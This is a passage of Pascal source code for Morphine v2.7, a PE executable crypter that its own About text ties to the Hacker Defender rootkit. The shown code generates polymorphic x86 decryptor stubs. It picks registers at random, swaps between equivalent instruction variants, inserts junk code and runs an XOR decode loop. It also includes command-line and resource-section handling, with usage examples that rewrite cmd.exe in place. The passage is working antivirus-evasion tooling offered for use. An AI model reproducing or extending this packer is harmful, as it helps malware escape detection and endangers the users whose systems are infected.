     Vars[1].Fix1:=4;
     Vars[1].Fix2:=3;
     LPB:=@Vars[1].Code;
     LReg:=RandomReg32Esp;
     XorReg32Reg32(LPB,LReg,LReg);
     RelJzAddr32(LPB,$12345678);

     Vars[2].Len:=7;
     Vars[2].Fix1:=3;
     Vars[2].Fix2:=2;
     LPB:=@Vars[2].Code;
     DecReg32(LPB,PolyContext.EipRegister);
     RelJnzAddr32(LPB,$12345678);
    end;

   PII_CODER_CALL_GET_EIP:
    with LInitInstr[AInstruction] do
    begin
     Count:=4;
     Vars[0].Len:=5;
     Vars[0].Fix1:=1;
     Vars[0].Fix2:=0;
     Vars[0].Fix3:=5;
     LPB:=@Vars[0].Code;
     RelCallAddr(LPB,$12345678);

     Vars[1].Len:=12;
     Vars[1].Fix1:=3;
     Vars[1].Fix2:=2;
     Vars[1].Fix3:=12;
     LPB:=@Vars[1].Code;
     RelJmpAddr8(LPB,5);
     RelJmpAddr32(LPB,$12345678);
     RelCallAddr(LPB,Cardinal(-10));

     Vars[2].Len:=5;
     Vars[2].Fix1:=Byte(-1);
     Vars[2].Fix2:=Byte(-1);
     Vars[2].Fix3:=5;
     LPB:=@Vars[2].Code;
     RelCallAddr(LPB,0);

     Vars[3].Len:=9;
     Vars[3].Fix1:=Byte(-1);
     Vars[3].Fix2:=Byte(-1);
     Vars[3].Fix3:=9;
     LPB:=@Vars[3].Code;
     RelJmpAddr8(LPB,2);
     RelJmpAddr8(LPB,5);
     RelCallAddr(LPB,Cardinal(-7));
    end;

   PII_CODER_GET_EIP:
    with LInitInstr[AInstruction] do
    begin
     Count:=4;
     Vars[0].Len:=1;
     LPB:=@Vars[0].Code;
     PopReg32(LPB,ARegister);

     Vars[1].Len:=3;
     LPB:=@Vars[1].Code;
     Inc(Vars[1].Len,MovReg32RegMem(LPB,ARegister,REG_ESP));
     AddReg32Num8(LPB,REG_ESP,4);

     Vars[2].Len:=3;
     LPB:=@Vars[2].Code;
     AddReg32Num8(LPB,REG_ESP,4);
     Inc(Vars[2].Len,MovReg32RegMemIdx8(LPB,ARegister,REG_ESP,Byte(-4)));

     Vars[3].Len:=4;
     LPB:=@Vars[3].Code;
     Inc(Vars[3].Len,MovReg32RegMem(LPB,ARegister,REG_ESP));
     IncReg32(LPB,REG_ESP);
     IncReg32(LPB,REG_ESP);
     IncReg32(LPB,REG_ESP);
     IncReg32(LPB,REG_ESP);
    end;

   PII_CODER_FIX_DST_PTR,PII_CODER_FIX_SRC_PTR:
    with LInitInstr[AInstruction] do
    begin
     Count:=4;
     Vars[0].Len:=2;
     LPB:=@Vars[0].Code;
     AddReg32Reg32(LPB,ARegister,PolyContext.EipRegister);

     Vars[1].Len:=6;
     LPB:=@Vars[1].Code;
     PushReg32(LPB,PolyContext.EipRegister);
     AddReg32Reg32(LPB,PolyContext.EipRegister,ARegister);
     MovReg32Reg32(LPB,ARegister,PolyContext.EipRegister);
     PopReg32(LPB,PolyContext.EipRegister);

     Vars[2].Len:=6;
     LPB:=@Vars[2].Code;
     PushReg32(LPB,PolyContext.EipRegister);
     AddReg32Reg32(LPB,PolyContext.EipRegister,ARegister);
     PushReg32(LPB,PolyContext.EipRegister);
     PopReg32(LPB,ARegister);
     PopReg32(LPB,PolyContext.EipRegister);

     Vars[3].Len:=2;
     LPB:=@Vars[3].Code;
     PushReg32(LPB,PolyContext.EipRegister);
     Inc(Vars[3].Len,AddReg32RegMem(LPB,ARegister,REG_ESP));
     PopReg32(LPB,PolyContext.EipRegister);
    end;

   PII_CODER_LOAD_KEY_TO_REG:
    with LInitInstr[AInstruction] do
    begin
     Count:=4;
     LPB:=@Vars[0].Code;
     Vars[0].Len:=MovReg32RegMem(LPB,ARegister,PolyContext.KeyAddrRegister);

     Vars[1].Len:=1;
     LPB:=@Vars[1].Code;
     Inc(Vars[1].Len,PushRegMem(LPB,PolyContext.KeyAddrRegister));
     PopReg32(LPB,ARegister);

     LPB:=@Vars[2].Code;
     Vars[2].Len:=LeaReg32Reg32(LPB,ARegister,PolyContext.KeyAddrRegister);
     Inc(Vars[2].Len,MovReg32RegMem(LPB,ARegister,ARegister));

     Vars[3].Len:=2;
     LPB:=@Vars[3].Code;
     XorReg32Reg32(LPB,ARegister,ARegister);
     Inc(Vars[3].Len,AddReg32RegMem(LPB,ARegister,PolyContext.KeyAddrRegister));
    end;

   PII_CODER_TEST_KEY_END:
    with LInitInstr[AInstruction] do
    begin
     Count:=4;
     LPB:=@Vars[0].Code;
     Vars[0].Len:=TestReg32Num32(LPB,ARegister,$FF000000);

     LPB:=@Vars[1].Code;
     Vars[1].Len:=TestRegMemNum32(LPB,PolyContext.KeyAddrRegister,$FF000000);

     LPB:=@Vars[2].Code;
     Vars[2].Len:=7;
     MovReg32Reg32(LPB,CtxFreeReg,ARegister);
     ShrReg32Num8(LPB,LFreeReg,$18);
     TestReg32Reg32(LPB,LFreeReg,LFreeReg);

     LPB:=@Vars[3].Code;
     Vars[3].Len:=11;
     PushReg32(LPB,ARegister);
     PopReg32(LPB,CtxFreeReg);
     AndReg32Num32(LPB,LFreeReg,$FF000000);
     CmpReg32Num8(LPB,LFreeReg,0);
    end;

   PII_CODER_JZ_CODER_BEGIN:
    with LInitInstr[AInstruction] do
    begin
     Count:=2;
     LPB:=@Vars[0].Code;
     Vars[0].Len:=6;
     Vars[0].Fix1:=2;
     Vars[0].Fix2:=0;
     RelJzAddr32(LPB,$12345678);

     LPB:=@Vars[1].Code;
     Vars[1].Len:=7;
     Vars[1].Fix1:=3;
     Vars[1].Fix2:=1;
     RelJnzAddr8(LPB,5);
     RelJmpAddr32(LPB,$12345678);
    end;

   PII_CODER_ADD_DATA_IDX:
    with LInitInstr[AInstruction] do
    begin
     Count:=4;
     LPB:=@Vars[0].Code;
     Vars[0].Len:=2;
     AddReg32Reg32(LPB,ARegister,PolyContext.DataSizeRegister);

     LPB:=@Vars[1].Code;
     Vars[1].Len:=2;
     PushReg32(LPB,PolyContext.DataSizeRegister);
     Inc(Vars[1].Len,AddReg32RegMem(LPB,ARegister,REG_ESP));
     PopReg32(LPB,PolyContext.DataSizeRegister);

     LPB:=@Vars[2].Code;
     Vars[2].Len:=6;
     PushReg32(LPB,CtxFreeReg);
     MovReg32Reg32(LPB,LFreeReg,PolyContext.DataSizeRegister);
     AddReg32Reg32(LPB,Aregister,LFreeReg);
     PopReg32(LPB,LFreeReg);

     LPB:=@Vars[3].Code;
     Vars[3].Len:=2;
     PushReg32(LPB,ARegister);
     Inc(Vars[3].Len,AddRegMemReg32(LPB,REG_ESP,PolyContext.DataSizeRegister));
     PopReg32(LPB,ARegister);
    end;

   PII_CODER_XOR_DATA_REG:
    with LInitInstr[AInstruction] do
    begin
     Count:=4;
     LPB:=@Vars[0].Code;
     Vars[0].Len:=XorReg32RegMem(LPB,ARegister,PolyContext.DataAddrRegister);

     LPB:=@Vars[1].Code;
     Vars[1].Len:=3;
     PushReg32(LPB,CtxFreeReg);
     Inc(Vars[1].Len,PushRegMem(LPB,PolyContext.DataAddrRegister));
     Inc(Vars[1].Len,XorReg32RegMem(LPB,ARegister,REG_ESP));
     PopReg32(LPB,LFreeReg);
     PopReg32(LPB,LFreeReg);

     LPB:=@Vars[2].Code;
     Vars[2].Len:=4;
     PushReg32(LPB,CtxFreeReg);
     Inc(Vars[2].Len,MovReg32RegMem(LPB,LFreeReg,PolyContext.DataAddrRegister));
     XorReg32Reg32(LPB,ARegister,LFreeReg);
     PopReg32(LPB,LFreeReg);

     LPB:=@Vars[3].Code;
     Vars[3].Len:=4;
     PushReg32(LPB,CtxFreeReg);
     Inc(Vars[3].Len,MovReg32RegMem(LPB,LFreeReg,PolyContext.DataAddrRegister));
     PushReg32(LPB,LFreeReg);
     Inc(Vars[3].Len,XorRegMemReg32(LPB,REG_ESP,ARegister));
     PopReg32(LPB,ARegister);
     PopReg32(LPB,LFreeReg);
    end;

   PII_CODER_STORE_DATA:
    with LInitInstr[AInstruction] do
    begin
     Count:=4;
     LPB:=@Vars[0].Code;
     Vars[0].Len:=1;

     if (PolyContext.DataAddrRegister<>REG_EDI) or (PolyContext.KeyBytesRegister<>REG_EAX) then
     begin
      if (PolyContext.DataAddrRegister<>REG_EDI) then Inc(Vars[0].Len,6);
      if (PolyContext.DataAddrRegister<>REG_EDI) then PushReg32(LPB,REG_EDI);

      if (PolyContext.DataAddrRegister<>REG_EAX) then Inc(Vars[0].Len,2);
      if (PolyContext.DataAddrRegister<>REG_EAX) then PushReg32(LPB,REG_EAX);

      if (PolyContext.DataAddrRegister<>REG_EDI) then PushReg32(LPB,PolyContext.DataAddrRegister);
      PushReg32(LPB,PolyContext.KeyBytesRegister);
      PopReg32(LPB,REG_EAX);
      if (PolyContext.DataAddrRegister<>REG_EDI) then PopReg32(LPB,REG_EDI);
      Inc(Vars[0].Len,4);
     end;
     Stosd(LPB);
     if (PolyContext.DataAddrRegister<>REG_EDI) or (PolyContext.KeyBytesRegister<>REG_EAX) then
     begin
      PushReg32(LPB,REG_EAX);
      if (PolyContext.DataAddrRegister<>REG_EDI) then PushReg32(LPB,REG_EDI);
      if (PolyContext.DataAddrRegister<>REG_EDI) then PopReg32(LPB,PolyContext.DataAddrRegister);
      PopReg32(LPB,PolyContext.KeyBytesRegister);
      if (PolyContext.DataAddrRegister<>REG_EAX) then PopReg32(LPB,REG_EAX);
      if (PolyContext.DataAddrRegister<>REG_EDI) then PopReg32(LPB,REG_EDI);
     end;

     LPB:=@Vars[1].Code;
     Vars[1].Len:=4;
     Inc(Vars[1].Len,MovRegMemReg32(LPB,PolyContext.DataAddrRegister,ARegister));
     IncReg32(LPB,PolyContext.DataAddrRegister);
     IncReg32(LPB,PolyContext.DataAddrRegister);
     IncReg32(LPB,PolyContext.DataAddrRegister);
     IncReg32(LPB,PolyContext.DataAddrRegister);

     LPB:=@Vars[2].Code;
     Vars[2].Len:=5;
     PushReg32(LPB,CtxFreeReg);
     Inc(Vars[2].Len,XchgReg32Reg32(LPB,REG_ESP,PolyContext.DataAddrRegister));
     PopReg32(LPB,LFreeReg);
     PushReg32(LPB,ARegister);
     PopReg32(LPB,LFreeReg);
     Inc(Vars[2].Len,XchgReg32Reg32(LPB,PolyContext.DataAddrRegister,REG_ESP));
     PopReg32(LPB,LFreeReg);

     LPB:=@Vars[3].Code;
     Vars[3].Len:=2;

     if ARegister=REG_EDI then
     begin
      MovReg32Reg32(LPB,CtxFreeReg,REG_EDI);
      Inc(Vars[3].Len,2);
     end;

     if PolyContext.DataAddrRegister<>REG_EDI then
     begin
      PushReg32(LPB,REG_EDI);
      MovReg32Reg32(LPB,REG_EDI,PolyContext.DataAddrRegister);
      Inc(Vars[3].Len,6);
     end;
     if ARegister=REG_EDI then PushReg32(LPB,LFreeReg)
     else PushReg32(LPB,ARegister);
     Inc(Vars[3].Len,XchgReg32Reg32(LPB,REG_ESI,REG_ESP));
     Movsd(LPB);
     Inc(Vars[3].Len,XchgReg32Reg32(LPB,REG_ESP,REG_ESI));
     if PolyContext.DataAddrRegister<>REG_EDI then
     begin
      MovReg32Reg32(LPB,PolyContext.DataAddrRegister,REG_EDI);
      PopReg32(LPB,REG_EDI);
     end;
    end;

   PII_CODER_INC_SRC_PTR:
    with LInitInstr[AInstruction] do
    begin
     Count:=4;
     LPB:=@Vars[0].Code;
     Vars[0].Len:=1;
     IncReg32(LPB,ARegister);

     LPB:=@Vars[1].Code;
     Vars[1].Len:=3;
     AddReg32Num8(LPB,ARegister,1);

     LPB:=@Vars[2].Code;
     Vars[2].Len:=3;
     SubReg32Num8(LPB,ARegister,Byte(-1));

     LPB:=@Vars[3].Code;
     Vars[3].Len:=7;
     PushReg32(LPB,CtxFreeReg);
     PushNum8(LPB,1);
     PopReg32(LPB,LFreeReg);
     AddReg32Reg32(LPB,ARegister,LFreeReg);
     PopReg32(LPB,LFreeReg);
    end;

   PII_CODER_LOOP_CODER_CODE:
    with LInitInstr[AInstruction] do
    begin
     Count:=1;
     LPB:=@Vars[0].Code;
     Vars[0].Len:=7;
     Vars[0].Fix1:=3;
     Vars[0].Fix2:=1;
     DecReg32(LPB,ARegister);
     RelJnzAddr32(LPB,$12345678);
    end;

  end;
 end;

begin
 ASize1:=ASize1 shr 2;
// ASize2:=ASize2 shr 2;

 ZeroMemory(@LInitInstr,SizeOf(LInitInstr));

 //generate random context
 with PolyContext do
 begin
{$IFNDEF STATIC_CONTEXT}
  DataSizeRegister:=REG_NON;
  DataAddrRegister:=REG_NON;
  EipRegister:=REG_NON;
  KeyAddrRegister:=REG_NON;
  KeyBytesRegister:=REG_NON;
  FreeRegisters[0]:=REG_NON;
  FreeRegisters[1]:=REG_NON;
{$ELSE}
//  DataSizeRegister:=REG_ESI;
//  DataAddrRegister:=REG_EBP;
//  EipRegister:=REG_ECX;
//  KeyAddrRegister:=REG_EAX;
//  KeyBytesRegister:=REG_EBX;
//  FreeRegisters[0]:=REG_EDI;
//  FreeRegisters[1]:=REG_EDX;
  DataSizeRegister:=REG_EAX;
  DataAddrRegister:=REG_EBX;
  EipRegister:=REG_ECX;
  KeyAddrRegister:=REG_EDX;
  KeyBytesRegister:=REG_ESI;
  FreeRegisters[0]:=REG_EDI;
  FreeRegisters[1]:=REG_EBP;
{$ENDIF}
 end;

{$IFNDEF STATIC_CONTEXT}
 for LI:=0 to Reg32Count-1 do LRegUsed[LI]:=False;
 LNotUsed:=Reg32Count-1;
 while LNotUsed>0 do
 begin
  LReg:=Random(Reg32Count);
  while LRegUsed[LReg] or (LReg=REG_ESP) do LReg:=(LReg+1) mod Reg32Count;
  LRegUsed[LReg]:=True;

  with PolyContext do
  case LNotUsed of
   1:DataSizeRegister:=LReg;
   2:DataAddrRegister:=LReg;
   3:EipRegister:=LReg;
   4:KeyAddrRegister:=LReg;
   5:KeyBytesRegister:=LReg;
   6:FreeRegisters[0]:=LReg;
   7:FreeRegisters[1]:=LReg;
  end;
  Dec(LNotUsed);
 end;
{$ENDIF}

// these lines are good for debugging
// PolyContext.DataSizeRegister:=REG_ESI;
// PolyContext.DataAddrRegister:=REG_EBX;
// PolyContext.EipRegister:=REG_EDX;
// PolyContext.KeyAddrRegister:=REG_EBP;
// PolyContext.KeyBytesRegister:=REG_EAX;
// PolyContext.FreeRegisters[0]:=REG_ECX;
// PolyContext.FreeRegisters[1]:=REG_EDI;

 GeneratePolyInstruction(PII_POLY_PUSHAD,REG_NON);
 GeneratePolyInstruction(PII_POLY_MOV_REG_LOADER_SIZE,PolyContext.DataSizeRegister);
 GeneratePolyInstruction(PII_POLY_MOV_REG_LOADER_ADDR,PolyContext.DataAddrRegister);

 GeneratePolyInstruction(PII_CODER_CALL_GET_EIP,REG_NON);
 GeneratePolyInstruction(PII_CODER_GET_EIP,PolyContext.EipRegister);
 GeneratePolyInstruction(PII_CODER_FIX_DST_PTR,PolyContext.DataAddrRegister);
 GeneratePolyInstruction(PII_CODER_MOV_REG_KEY,PolyContext.KeyAddrRegister);
 GeneratePolyInstruction(PII_CODER_FIX_SRC_PTR,PolyContext.KeyAddrRegister);
 GeneratePolyInstruction(PII_CODER_LOAD_KEY_TO_REG,PolyContext.KeyBytesRegister);
 GeneratePolyInstruction(PII_CODER_TEST_KEY_END,PolyContext.KeyBytesRegister);
 GeneratePolyInstruction(PII_CODER_JZ_CODER_BEGIN,REG_NON);
 GeneratePolyInstruction(PII_CODER_ADD_DATA_IDX,PolyContext.KeyBytesRegister);
 GeneratePolyInstruction(PII_CODER_XOR_DATA_REG,PolyContext.KeyBytesRegister);
 GeneratePolyInstruction(PII_CODER_STORE_DATA,PolyContext.KeyBytesRegister);
 GeneratePolyInstruction(PII_CODER_INC_SRC_PTR,PolyContext.KeyAddrRegister);
 GeneratePolyInstruction(PII_CODER_LOOP_CODER_CODE,PolyContext.DataSizeRegister);
 GeneratePolyInstruction(PII_POLY_JMP_DYNLOADER,REG_NON);

 //
 //now put some rubbish, select instruction and write it there
 //then put some rubbish, select next instruction and write it there
 //then put some ...
 //
 //but be careful with PII_CODER_TEST_KEY_END and PII_CODER_JZ_CODER_BEGIN instructions which is test and condition jump
 //don't put the rubbish between them
 //

 ZeroMemory(InitData,InitSize);
 LRemaining:=InitSize;

 LPB:=InitData;
 LCodeStart:=NtHeaders.OptionalHeader.ImageBase+NtHeaders.OptionalHeader.AddressOfEntryPoint;
 LVirtAddr:=LCodeStart;

 for LI:=0 to InitInstrCount-1 do
 with LInitInstr[LI] do
 begin
  LDelta:=InitInstrCount-LI;
  LDelta2:=LRemaining-LDelta*10;
  LRubbishSize:=Random(LDelta2 div LDelta);
  if (LI<>PII_CODER_JZ_CODER_BEGIN) and (LRubbishSize>0) then           //can't change flags after test
  begin
   GenerateRubbishCode(LPB,LRubbishSize,LVirtAddr);
   Inc(LPB,LRubbishSize);
   Inc(LVirtAddr,LRubbishSize);
   Dec(LRemaining,LRubbishSize);
  end;

  VirtualAddress:=LVirtAddr;
  Index:=Random(LInitInstr[LI].Count);
  with Vars[Index] do
  begin
   CopyMemory(LPB,@Code,Len);
   Inc(LPB,Len);
   Inc(LVirtAddr,Len);
   Dec(LRemaining,Len);
  end;
 end;

 LRubbishSize:=Random(LRemaining);
 GenerateRubbishCode(LPB,LRubbishSize,LVirtAddr);
 Dec(LRemaining,LRubbishSize);
 Inc(LPB,LRubbishSize);
 LRubbishSize:=LRemaining;
 GenerateRandomBuffer(LPB,LRubbishSize);


 //
 //now correct pointers
 //

 //we do call and pop for getting eip
 //but we need only imagebase so we need to subtract rva of this call
 LEIPSub:=InsVAddr(PII_CODER_CALL_GET_EIP)-ACodePtr+InsFix3(PII_CODER_CALL_GET_EIP);

 FixInstr(PII_POLY_MOV_REG_LOADER_SIZE,ASize1);
 FixInstr(PII_POLY_MOV_REG_LOADER_Addr,AData1Ptr-LEIPSub);

 FixInstr(PII_CODER_MOV_REG_KEY,AKeyPtr-LEIPSub);
 FixInstr(PII_CODER_CALL_GET_EIP,CallAddress(PII_CODER_CALL_GET_EIP,PII_CODER_GET_EIP)-InsFix2(PII_CODER_CALL_GET_EIP));
 FixInstr(PII_CODER_JZ_CODER_BEGIN,JcxAddress(PII_CODER_JZ_CODER_BEGIN,PII_CODER_KEY_START)-InsFix2(PII_CODER_JZ_CODER_BEGIN));
 FixInstr(PII_CODER_LOOP_CODER_CODE,JcxAddress(PII_CODER_LOOP_CODER_CODE,PII_CODER_CODE)-InsFix2(PII_CODER_LOOP_CODER_CODE));

 FixInstr(PII_POLY_JMP_DYNLOADER,ADynLoadAddr-(InsVAddr(PII_POLY_JMP_DYNLOADER)+5)-InsFix2(PII_POLY_JMP_DYNLOADER));


//
//this can tell you more about what it finally does
//
//

//                                                        // PII_BEGIN
// pusha

//                                                        // PII_POLY_BEGIN
// mov ecx,0WWXXYYZZh                //loader size        // PII_POLY_MOV_REG_LOADER_SIZE
// mov edi,0WWXXYYZZh                //loader addr        // PII_POLY_MOV_REG_LOADER_ADDR

//                                                        // PII_CODER_BEGIN
// call PII_CODER_GET_EIP                                 // PII_CODER_CALL_GET_EIP
// pop edx                                                // PII_CODER_GET_EIP
// add edi,edx                                            // PII_CODER_FIX_DST_PTR
//                                                        // PII_CODER_KEY_START
// mov esi,0WWXXYYZZh                //key addr           // PII_CODER_MOV_REG_KEY
// add esi,edx                                            // PII_CODER_FIX_SRC_PTR
//                                                        // PII_CODER_CODE
// mov eax,[esi]                     //load key bytes     // PII_CODER_LOAD_KEY_TO_REG
// test eax,0FF000000h               //test end of key    // PII_CODER_TEST_KEY_END
// jz PII_CODER_KEY_START            //restart key        // PII_CODER_JZ_CODER_BEGIN
// add eax,ecx                       //add some stuff     // PII_CODER_ADD_DATA_IDX
// xor [edi],eax                     //decode             // PII_CODER_XOR_DATA_REG
// stosd                             //store data         // PII_CODER_STORE_DATA
// inc esi                           //change key         // PII_CODER_INC_SRC_PTR
// loop PII_CODER_CODE                                    // PII_CODER_LOOP_CODER_CODE
//                                                        // PII_CODER_END

// jmp @DynLoader_begin                                   // PII_POLY_JMP_DYNLOADER
//                                                        // PII_POLY_END

//                                                        // PII_END

end;

function ExtractFileName(APath:string):string;
//return file name from full path string
var
 LI,LJ:Integer;
begin
 if Length(APath)<>0 then
 begin
  LJ:=0;
  for LI:=Length(APath) downto 1 do
   if APath[LI]='\' then
   begin
    LJ:=LI;
    Break;
   end;
  Result:=Copy(APath,LJ+1,MaxInt);
 end else Result:='';
end;

procedure About;
begin
 WriteLn;
 WriteLn('Morphine v2.7');
 WriteLn('by Holy_Father && Ratter/29A');
 WriteLn('as a part of Hacker Defender rootkit - http://rootkit.host.sk');
 WriteLn('Copyright (c) 2000,forever ExEwORx');
 WriteLn('betatested by ch0pper <THEMASKDEMON@flashmail.com>');
 WriteLn('birthday: 03.10.2004');
 WriteLn;
end;

procedure Usage;
var
 LStr:string;
begin
 LStr:=ExtractFileName(ParamStr(0));
 About;
 WriteLn('Usage: ',LStr,' [-q] [-d] [-b:ImageBase] [-o:OutputFile] InputFile ');
 WriteLn('  -q             be quiet (no console output)');
 WriteLn('  -d             for dynamic DLLs only');
 WriteLn('  -i             save resource icon and XP manifest');
 WriteLn('  -a             save overlay data from the end of original file');
 WriteLn('  -b:ImageBase   specify image base in hexadecimal string');
 WriteLn('                 (it is rounded up to next 00010000 multiple)');
 WriteLn('  -o:OutputFile  specify file for output');
 WriteLn('                 (InputFile will be rewritten if no OutputFile given)');
 WriteLn;
 WriteLn('Examples:');
 WriteLn('1) ',LStr,' -q c:\winnt\system32\cmd.exe');
 WriteLn(' rewrite cmd.exe in system directory and write no info');
 WriteLn;
 WriteLn('2) ',LStr,' -b:1F000000 -o:newcmd.exe c:\winnt\system32\cmd.exe');
 WriteLn(' create new file called newcmd.exe based on cmd.exe in system dir');
 WriteLn(' set its image base to 0x1F000000 and display info about processing');
 WriteLn;
 WriteLn('3) ',LStr,' -d static.dll');
 WriteLn(' rewrite static.dll which is loaded only dynamically');
 WriteLn;
 WriteLn('4) ',LStr,' -i -o:cmdico.exe c:\winnt\system32\cmd.exe');
 WriteLn(' create new file called cmdico.exe based on cmd.exe in system dir');
 WriteLn(' save its icon and or XP manifest in resource section');
 WriteLn;
 WriteLn('5) ',LStr,' -i -a srv.exe');
 WriteLn(' rewrite srv.exe, save its icon, XP manifest and overlay data');
 WriteLn;
 Halt;
end;

procedure ErrorMsg(AErrorMsg:string);
begin
 if not Quiet then WriteLn('Error (',GetLastError,'): ',AErrorMsg);
end;

function UpperCase(AStr:string):string;
//upcase for string
var
 LI:Integer;
begin
 SetLength(Result,Length(AStr));
 for LI:=1 to Length(AStr) do Result[LI]:=UpCase(AStr[LI]);
end;

{$R-}
function IntToHex(ACard:Cardinal;ADigits:Byte):string;
//converts a number to hex string
const
 HexArray:array[0..15] of Char=('0','1','2','3','4','5','6','7','8','9','A','B','C','D','E','F');
var
 LHex:string;
 LInt,LHInt:Cardinal;
begin
 LHex:=StringOfChar('0',ADigits);
 LInt:=ADigits;
 LHInt:=16;
 while ACard>0 do
 begin
  LHex[LInt]:=HexArray[(ACard mod LHint) mod 16];
  ACard:=ACard div 16;
  LHInt:=LHInt*16;
  if LHInt=0 then LHInt:=$FFFFFFFF;
  Dec(LInt);
 end;
 Result:=LHex;
end;

function HexToInt(AHex:string):Cardinal;
//converts hex string to number
var
 LI,LO:Byte;
 LM:Cardinal;
begin
 LM:=1;
 Result:=0;
 AHex:=UpperCase(AHex);
 if (Length(AHex)>2) and (AHex[2]='X') then AHex:=Copy(AHex,3,MaxInt);

 for LI:=Length(AHex) downto 1 do
 begin
  if not ((AHex[LI] in ['0'..'9']) or (AHex[LI] in ['A'..'F'])) then
  begin
   Result:=0;
   Exit;
  end;
  if AHex[LI] in ['0'..'9'] then LO:=48 else LO:=55;
  LO:=Ord(AHex[LI])-LO;
  Result:=Result+LO*LM;
  LM:=LM shl 4;
 end;
end;
{$R+}


function CheckPEFile(AData:PByte):Boolean;
//return True if AData points on valid image file
var
 LPNtHdr:PImageNtHeaders;
begin
 Result:=False;
 try
  if PImageDosHeader(AData)^.e_magic<>PWord(PChar('MZ'))^ then Exit;

  LPNtHdr:=Pointer(Cardinal(AData)+Cardinal(PImageDosHeader(AData)^._lfanew));

  if LPNtHdr^.Signature<>PCardinal(PChar('PE'))^ then Exit;
  if LPNtHdr^.FileHeader.Machine<>IMAGE_FILE_MACHINE_I386 then Exit;
  if LPNtHdr^.OptionalHeader.Magic<>IMAGE_NT_OPTIONAL_HDR_MAGIC then Exit;
  Result:=True;
 except
 end;
end;

function ProcessCmdLine:Boolean;
//process command line, return true if args are ok
var
 LI:Integer;
 LPar,LUpArg:string;
begin
 Result:=False;

 Options:='';
 Quiet:=False;
 DynamicDLL:=False;
 SaveIcon:=False;
 SaveOverlay:=False;
 ReqImageBase:=0;
 InputFileName:='';
 OutputFileName:='';

 if (ParamCount<1) or (ParamCount>5) then Exit;
 LI:=1;
 while LI<=ParamCount do
 begin
  LPar:=ParamStr(LI);
  LUpArg:=UpperCase(LPar);
  if LUpArg[1]='-' then
  begin
   if Length(LUpArg)=1 then Break;
   case LUpArg[2] of
    'Q':Quiet:=True;
    'D':DynamicDLL:=True;
    'I':SaveIcon:=True;
    'A':SaveOverlay:=True;
    'B','O':begin
     if Length(LUpArg)<4 then Break;
     if LUpArg[3]<>':' then Break;
     if LUpArg[2]='B' then
     begin
      ReqImageBase:=HexToInt(Copy(LUpArg,4,MaxInt));
      if ReqImageBase=0 then Break;
     end else OutputFileName:=Copy(LPar,4,MaxInt);
    end;
    else Break;
   end;
  end else
  begin
   InputFileName:=LPar;
   Inc(LI);
   Break;
  end;
  Inc(LI);
 end;
 if Length(OutputFileName)=0 then OutputFileName:=InputFileName;
 Result:=(LI-1=ParamCount) and (Length(InputFileName)>0);
end;

function MyAlloc(ASize:Cardinal):Pointer;
//allocate memory via VirtualAlloc
begin
 Result:=VirtualAlloc(nil,ASize,MEM_COMMIT,PAGE_EXECUTE_READWRITE);
end;

function MyFree(APtr:Pointer):Boolean;
//free memory via VirtualAlloc
begin
 if APtr<>nil then Result:=VirtualFree(APtr,0,MEM_RELEASE)
 else Result:=False;
end;

procedure PrepareResourceSectionData;
//extract and fill resource secion
var
 LTypeTable:record
  Directory:TResourceDirectoryTable;
  IconsEntry,IconGroupEntry,XPEntry:TResourceDirectoryEntry;
 end;

 LXPManifest:record
  NameDir:TResourceTableDirectoryEntry;
  LangDir:TResourceTableDirectoryEntry;
  DataEntry:TResourceDataEntry;
 end;

 LIconGroup:record
  GroupNameDir:TResourceTableDirectoryEntry;
  GroupLangDir:TResourceTableDirectoryEntry;
  GroupData:TResourceDataEntry;

  IconCount:Integer;

  NameDir:TResourceDirectoryTable;
  NameEntries:array[0..31] of TResourceDirectoryEntry;

  LangDirs:array[0..31] of TResourceTableDirectoryEntry;

  DataEntries:array[0..31] of TResourceDataEntry;
 end;

 LResourceStrings:array[0..1023] of Char;
 LResourceData:array[0..65535] of Char;
 LResourceStringsPtr,LResourceDataPtr:Cardinal;

 LIconDirectory:PIconDirectory;

 LNameEntry:PResourceDirectoryEntry;
 LLangEntry:PResourceTableDirectoryEntry;
 LDataEntry:PResourceDataEntry;
 LNameRVA,LSubEntryRVA,LSize,LResStringsRVA,LResDataRVA,LManifestSize,LResRawRVA:Cardinal;
 LNameLen:Word;
 LPB,LPBManifest:PByte;
 LI:Integer;
 LImage:HMODULE;
 LIcoRes:HRSRC;

begin
 LImage:=LoadLibraryEx(PChar(InputFileName),0,LOAD_LIBRARY_AS_DATAFILE);
 ResourceSectionSize:=0;
 ZeroMemory(@LTypeTable,SizeOf(LTypeTable));
 if ResourceIconGroup<>nil then Inc(LTypeTable.Directory.NumberOfIDEntries,2);
 if ResourceXPManifest<>nil then Inc(LTypeTable.Directory.NumberOfIDEntries);
 LTypeTable.IconsEntry.NameID:=Cardinal(RT_ICON);
 LTypeTable.IconsEntry.SubdirDataRVA:=$80000000;
 LTypeTable.IconGroupEntry.NameID:=Cardinal(RT_GROUP_ICON);
 LTypeTable.IconGroupEntry.SubdirDataRVA:=$80000000;
 LTypeTable.XPEntry.NameID:=RT_XP_MANIFEST;
 LTypeTable.XPEntry.SubdirDataRVA:=$80000000;

 LResourceStringsPtr:=0;
 LResourceDataPtr:=0;

 if ResourceIconGroup<>nil then
 begin
  ZeroMemory(@LIconGroup,SizeOf(LIconGroup));
  LPB:=Pointer(ResourceIconGroup);
  Inc(LPB,SizeOf(TResourceDirectoryTable));
  LNameEntry:=Pointer(LPB);

  LNameRVA:=LNameEntry^.NameID and $7FFFFFFF;
  LSubEntryRVA:=LNameEntry^.SubdirDataRVA and $7FFFFFFF;

  if LNameEntry^.NameID and $80000000<>0 then
  begin
   LIconGroup.GroupNameDir.Table.NumberOfNameEntries:=1;
   LPB:=RVA2RAW(Ptr,MainData,HostResourceSectionVirtualAddress+LNameRVA);
   LNameLen:=2*PWord(LPB)^;
   LIconGroup.GroupNameDir.Directory.NameID:=LResourceStringsPtr+$80000000;
   CopyMemory(@LResourceStrings[LResourceStringsPtr],LPB,LNameLen+2);
   Inc(LResourceStringsPtr,LNameLen+2);
  end else
  begin
   LIconGroup.GroupNameDir.Directory.NameID:=LNameEntry^.NameID;
   LIconGroup.GroupNameDir.Table.NumberOfIDEntries:=1;
  end;
  LIconGroup.GroupNameDir.Directory.SubdirDataRVA:=0;

  LLangEntry:=RVA2RAW(Ptr,MainData,HostResourceSectionVirtualAddress+LSubEntryRVA);
  LSubEntryRVA:=LLangEntry^.Directory.SubdirDataRVA and $7FFFFFFF;
  LIconGroup.GroupLangDir.Table.NumberOfIDEntries:=1;
  LIconGroup.GroupLangDir.Directory.NameID:=LLangEntry^.Directory.NameID;
  LIconGroup.GroupLangDir.Directory.SubdirDataRVA:=0;

